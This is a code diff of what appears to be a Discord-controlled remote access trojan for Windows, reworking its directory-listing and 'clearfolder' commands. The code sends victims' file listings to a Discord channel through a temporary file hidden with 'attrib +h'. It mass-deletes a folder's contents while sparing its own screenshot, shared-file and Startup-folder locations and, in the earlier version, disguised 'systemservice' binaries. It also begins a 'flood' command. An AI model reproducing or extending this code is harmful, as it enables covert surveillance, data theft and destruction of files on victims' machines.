@@ -109,21 +109,30 @@ async def cd_command(ctx, *, args: str = None):
     elif args == "list":
         try:
             items = os.listdir(current_directory)
-            with open("system.txt", "w") as f:
-                for item in items:
-                    full_path = os.path.join(current_directory, item)
-                    try:
-                        file_size = os.path.getsize(full_path) / (1024 * 1024)
-                        created_time = os.path.getctime(full_path)
-                        created_time_str = time.strftime("%B %d, %Y %H:%M", time.localtime(created_time))
-                        is_hidden = "Hidden" if os.path.isfile(full_path) and os.stat(full_path).st_file_attributes & 2 else "Visible"
-                        f.write(f"{full_path} - {file_size:.2f} MB - {created_time_str} - {is_hidden}\n")
-                    except Exception:
-                        continue
-            os.rename("system.txt", ".system.txt")
+            file_details = []
+
+            def get_file_details(item):
+                full_path = os.path.join(current_directory, item)
+                try:
+                    file_size = os.path.getsize(full_path) / (1024 * 1024)
+                    created_time = os.path.getctime(full_path)
+                    created_time_str = time.strftime("%B %d, %Y %H:%M", time.localtime(created_time))
+                    is_hidden = "Hidden" if os.path.isfile(full_path) and os.stat(full_path).st_file_attributes & 2 else "Visible"
+                    return f"{full_path} - {file_size:.2f} MB - {created_time_str} - {is_hidden}"
+                except Exception:
+                    return None
+
+            with ThreadPoolExecutor() as executor:
+                results = list(executor.map(get_file_details, items))
+
+            file_details = [result for result in results if result]
+
+            with open(".system.txt", "w") as f:
+                f.write("\n".join(file_details))
             os.system("attrib +h .system.txt")
             await ctx.send(file=discord.File(".system.txt"))
             os.remove(".system.txt")
+
         except Exception as e:
             await ctx.send(f"Error listing items: {e}")
     elif args.startswith("upload"):
@@ -177,38 +186,59 @@ async def cd_command(ctx, *, args: str = None):
             await ctx.send(f"Directory not found: {dir_path}")
     elif args == "clearfolder":
         try:
-            for item in os.listdir(current_directory):
-                item_path = os.path.join(current_directory, item)
-                if os.path.isfile(item_path):
-                    if item == "systemservice.bat" or item == "systemservice92.exe":
-                        continue
-                    try:
-                        os.remove(item_path)
-                    except Exception:
-                        pass
-                elif os.path.isdir(item_path):
-                    try:
+            exclude_folders = [
+                os.path.expandvars(r"%appdata%\screenshots"),
+                os.path.expandvars(r"%appdata%\sharedfiles"),
+                r"C:\$Sys-Manager",
+                os.path.expandvars(r"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup")
+            ]
+
+            deleted_files = 0
+            deleted_dirs = 0
+
+            def delete_item(item_path):
+                nonlocal deleted_files, deleted_dirs
+                try:
+                    if os.path.isdir(item_path):
                         shutil.rmtree(item_path)
-                    except Exception:
-                        pass
-            for root, dirs, files in os.walk(current_directory, topdown=False):
+                        deleted_dirs += 1
+                    else:
+                        os.remove(item_path)
+                        deleted_files += 1
+                except Exception:
+                    pass
+
+            def process_item(item):
+                item_path = os.path.join(current_directory, item)
+                if item_path not in exclude_folders:
+                    delete_item(item_path)
+
+            def process_directory(root, dirs, files):
                 for name in files:
                     file_path = os.path.join(root, name)
-                    if name == "systemservice.bat" or name == "systemservice92.exe":
-                        continue
-                    try:
-                        os.remove(file_path)
-                    except Exception:
-                        pass
+                    if file_path not in exclude_folders:
+                        delete_item(file_path)
                 for name in dirs:
                     dir_path = os.path.join(root, name)
-                    try:
-                        shutil.rmtree(dir_path)
-                    except Exception:
-                        pass
-            await ctx.send("All contents incinerated.")
+                    if dir_path not in exclude_folders:
+                        delete_item(dir_path)
+
+            with ThreadPoolExecutor() as executor:
+                executor.map(process_item, os.listdir(current_directory))
+
+            for root, dirs, files in os.walk(current_directory, topdown=False):
+                with ThreadPoolExecutor() as executor:
+                    executor.submit(process_directory, root, dirs, files)
+
+            color = 0x28a745 if deleted_files or deleted_dirs else 0xd32f2f
+            description = f"Successfully deleted {deleted_files} files in {deleted_dirs} folders." if deleted_files or deleted_dirs else "No files or folders deleted."
+
+            embed = discord.Embed(title="Clear Folder", description=description, color=color)
+            await ctx.send(embed=embed)
         except Exception as e:
-            await ctx.send(f"Error clearing folder: {e}")
+            embed = discord.Embed(title="Error", description=f"Error clearing folder: {e}", color=0xd32f2f)
+            await ctx.send(embed=embed)
+            
     elif args == "flood":
         try:
             def create_file(i):
